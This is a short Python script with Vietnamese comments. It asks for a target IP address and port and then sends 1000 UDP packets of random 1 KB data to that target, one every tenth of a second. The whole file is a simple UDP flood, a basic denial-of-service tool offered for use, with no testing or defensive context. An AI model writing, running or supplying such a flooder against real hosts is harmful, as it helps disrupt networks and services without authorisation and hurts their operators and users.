import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))

# Địa chỉ và cổng đích
target_address = (ip, port)

# Số lượng vòng lặp thực tế hơn
num_messages = 1000
chunk_size = 1024  # Kích thước của mỗi gói tin (1 KB)

for i in range(num_messages):
    data = random._urandom(chunk_size)
    s.sendto(data, target_address)
    print(f"Sent: {i + 1}", end='\r')
    time.sleep(0.1)  # Thay vì `sleep`, sử dụng `time.sleep`

s.close()